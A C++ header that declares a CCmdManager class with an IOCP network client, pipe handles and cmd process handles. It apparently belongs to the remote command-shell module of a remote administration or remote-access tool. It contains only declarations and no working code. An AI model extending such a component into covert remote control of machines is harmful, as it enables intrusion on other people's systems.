#pragma once
#include "Manager.h"
#include "Common.h"

class CCmdManager :
	public CManager
{
public:
	CCmdManager(_CIOCPClient* IOCPClient);
	~CCmdManager();

	VOID CCmdManager::HandleIO(PBYTE BufferData, ULONG BufferLength);
	static DWORD WINAPI ReceiveProceduce(LPVOID ParameterData);


public:
	HANDLE  m_ThreadHandle;
	BOOL	 m_IsLoop;
	HANDLE  m_ReadHandle1;
	HANDLE	m_WriteHandle1;
	HANDLE	m_ReadHandle2;
	HANDLE	m_WriteHandle2;
	HANDLE m_CmdProcessHandle;
	HANDLE m_CmdThreadHandle;
	BYTE m_CmdCodeLength;

	//m_GetPipeData
};

